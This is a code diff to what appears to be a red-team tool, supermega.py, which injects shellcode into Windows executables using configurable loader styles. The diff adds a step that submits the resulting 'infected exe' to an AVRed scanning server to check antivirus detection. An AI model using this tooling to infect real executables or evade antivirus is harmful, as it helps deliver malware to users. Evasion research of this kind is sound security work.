@@ -13,12 +13,10 @@ import phases.assembler
 import phases.injector
 from observer import observer
 from pe.pehelper import extract_code_from_exe_file_ep
-
+from sender import scannerDetectsBytes
 from model.project import Project
 from model.settings import Settings
 from model.defs import *
-from model.carrier import Carrier
-from model.exehost import ExeHost
 from log import setup_logging, writelog
 
 
@@ -60,7 +58,6 @@ def main():
             settings.source_style = SourceStyle.peb_walk
         elif args.sourcestyle == "iat_reuse":
             settings.source_style = SourceStyle.iat_reuse
-
     if args.alloc:
         if args.alloc == "rwx_1":
             settings.alloc_style = AllocStyle.RWX
@@ -72,7 +69,6 @@ def main():
     if args.exec:
         if args.exec == "direct_1":
             settings.exec_style = ExecStyle.CALL
-
     if args.inject:
         if args.rbrunmode == "eop":
             settings.inject_mode = InjectStyle.ChangeEntryPoint
@@ -88,7 +84,6 @@ def main():
         logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
         logger.info(r"Example: .\supermega.py --shellcode .\data\shellcodes\calc64.bin --inject .\data\exes\7z.exe")
         return 1
-
     if args.shellcode:
         if not os.path.isfile(args.shellcode):
             logger.info("Could not find: {}".format(args.shellcode))
@@ -191,15 +186,21 @@ def start(settings: Settings):
     
     observer.add_code("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
 
-    # Start/verify it at the end
-    if settings.verify:
-        logger.info("--[ Verify infected exe")
-        exit_code = phases.injector.verify_injected_exe(settings.inject_exe_out)
-    elif settings.try_start_final_infected_exe:
-        logger.info("--[ Start infected exe: {}".format(settings.inject_exe_out))
-        run_process_checkret([
-            settings.inject_exe_out,
-        ], check=False)
+    if config.get("avred_server") != "":
+        with open(settings.inject_exe_out, "rb") as f:
+            data = f.read()
+        scannerDetectsBytes(data, "test.exe", useBrotli=True, verify=settings.verify)
+
+    else:
+        # Start/verify it at the end
+        if settings.verify:
+            logger.info("--[ Verify infected exe")
+            exit_code = phases.injector.verify_injected_exe(settings.inject_exe_out)
+        elif settings.try_start_final_infected_exe:
+            logger.info("--[ Start infected exe: {}".format(settings.inject_exe_out))
+            run_process_checkret([
+                settings.inject_exe_out,
+            ], check=False)
 
     # Cleanup files
     if settings.cleanup_files_on_exit:
